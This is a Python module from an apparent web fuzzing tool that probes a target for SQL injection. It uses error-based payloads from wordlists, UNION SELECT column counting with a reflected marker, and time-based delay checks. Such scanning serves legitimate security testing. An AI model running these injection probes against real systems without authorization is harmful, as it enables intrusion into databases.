from ..requester import requester
from ..inject import injectPayload
from ..utils import reader, generate_marker, similar, formater
from ..analyzers.sqli import error_based, time_based, marker_union_based
from statistics import median
import logging

logger = logging.getLogger("webfuzz")

def baseline_time(location, url, headers, data, method, n=3):
    times=[]
    for _ in range(n):
        last = requester(url, headers, data, method)
        times.append(last.elapsed.total_seconds() * 1000.0)
    return median(times)

def union_nulls(n):
    return " UNION SELECT " + ",".join(["NULL"] * n)

def union_marker(n, index, marker):
    cols = ["NULL"] * n
    cols[index] = marker
    return " UNION SELECT " + ",".join(cols)

def union_detect(location, url, headers, data, method, pre_payload, end_payload, max_cols=10, min_gap=0.02, probe_cols_each_n=5):
    base = requester(url, headers, data, method)
    base_res = base.text
    base_status_code = base.status_code
    scores=[]
    for i in range(1, max(1,max_cols + 1)):
        payload = pre_payload + union_nulls(i) + end_payload
        new_url, new_headers, new_data = injectPayload(location, url, headers, data, payload)
        res = requester(new_url, new_headers, new_data, method)
        if res.status_code != base_status_code:
            continue
        sim = similar(base_res, res.text)
        delta_len = abs(len(base_res or "") - len(res.text or ""))
        scores.append((i, sim, delta_len))
    if not scores:
        return None
    scores.sort(key=lambda x:(-x[1], x[2]))
    best_index, best_similar, best_delta = scores[0]
    second_similar = scores[1][1] if len(scores) > 1 else 0.0
    gap = best_similar - second_similar
    ambigous = gap < min_gap 
    marker = generate_marker()
    new_url, new_headers, new_data = injectPayload(location, url, headers, data, marker)
    r = requester(new_url, new_headers, new_data, method)
    if marker not in r.text:
        marker_send = f'"{marker}"'
    else:
        marker_send = "0x" + marker.encode().hex()
    if not ambigous:
        for i in range(best_index):
            payload = pre_payload + union_marker(best_index, i, marker_send) + end_payload
            new_url, new_headers, new_data = injectPayload(location, url, headers, data, payload)
            response = requester(new_url, new_headers, new_data, method)
            res = marker_union_based(marker, response.text)
            if res:
                res.update({
                    "payload": payload,
                    "location": location,
                    "status": response.status_code,
                    "elapsed_ms": response.elapsed.total_seconds() * 1000.0,
                    "detail": f"ncols={best_index} reflected_col={i+1} sim={best_similar:.3f}",
              })
                return res
    for n, sim, _ in scores:
        for i in range(min(n,probe_cols_each_n)):
            payload = pre_payload + union_marker(n, i, marker_send) + end_payload
            new_url, new_headers, new_data = injectPayload(location, url, headers, data, payload)
            response = requester(new_url, new_headers, new_data, method)
            res = marker_union_based(marker, response.text)
            if res:
                res.update({
                    "payload": payload,
                    "location": location,
                    "status": response.status_code,
                    "elapsed_ms": response.elapsed.total_seconds() * 1000.0,
                    "detail": f"ncols={n} reflected_col={i+1} sim={sim:.3f}",
              })
                return res
    return None

def fuzz_sqli(wordlist, location, url, headers, data, method, delay_time):
    if delay_time is None:
        delay_time = 3000.0
    logger.info("Fuzzing SQLi: Error-Based technique")
    MAX_SHOW_ERR = 4
    hits_err = 0
    hits_union = 0
    hits_time = 0
    wordlist_error = wordlist if wordlist else "wordlists/sqli_error.txt"
    payloads_error = reader(wordlist_error)
    for payload in payloads_error:
        new_url, new_headers, new_data = injectPayload(location, url, headers, data, payload)
        response = requester(new_url, new_headers, new_data, method)
        res = error_based(response.text)
        if res != None:
            if hits_err == 0:
                logger.newline()
            msg = formater("SQLI.error_based.hit", payload=payload, evidence=f"pattern detect: {res.group()}", status=response.status_code)
            if hits_err < MAX_SHOW_ERR:
                hits_err += 1
                logger.vuln(msg)
            else:
                hits_err += 1
                logger.vuln_to_file(msg)
    logger.newline()
    logger.info("Fuzzing SQLi: Union-based technique")
    pre_payloads = ["test' ", 'test" ', "test "]
    end_payloads = ["-- -", "#"]
    for pre_payload in pre_payloads:
        for end_payload in end_payloads:
            res = union_detect(location, url, headers, data, method, pre_payload, end_payload)
            if res is not None:
                if hits_union == 0:
                    logger.newline()
                hits_union += 1
                logger.vuln(formater("SQLI.union_based.hit", payload=res.get("payload"), evidence=res.get("evidence"), detail=res.get("detail"), status=res.get("status")))
    
    logger.newline()
    logger.info("Fuzzing SQLi: Time-based technique")
    wordlist_time = wordlist if wordlist else "wordlists/sqli_time.txt"
    payloads_time = reader(wordlist_time)
    base_time = baseline_time(location, url, headers, data, method)
    for payload in payloads_time:
        new_url, new_headers, new_data = injectPayload(location, url, headers, data, payload)
        response = requester(new_url, new_headers, new_data, method)
        res = time_based(response.elapsed.total_seconds() * 1000.0, base_time, delay_time)
        if res is not None:
            new_url, new_headers, new_data = injectPayload(location, url, headers, data, payload)
            response = requester(new_url, new_headers, new_data, method)
            res = time_based(response.elapsed.total_seconds() * 1000.0, base_time, delay_time)
            if res:
                if hits_time == 0:
                    logger.newline()
                hits_time += 1
                logger.vuln(formater("SQLI.time_based.hit", payload=payload, evidence=res.get("evidence"), status=response.status_code))
    
    total_hits = hits_err + hits_union + hits_time
    showing = MAX_SHOW_ERR if hits_err > MAX_SHOW_ERR else hits_err
    showing +=  hits_union + hits_time
    if not total_hits:
        logger.newline()
        logger.info("SQLi: no payload matched (0 hits)")
    else:
        logger.newline()
        logger.info(f"SQLI: {total_hits} hits ({hits_err}-error_based/{hits_union}-union_based/{hits_time}-time_based) (showing {showing})")
    if hits_err >= MAX_SHOW_ERR:
        print("[INFO] See --log-file for full list hit payloads")




    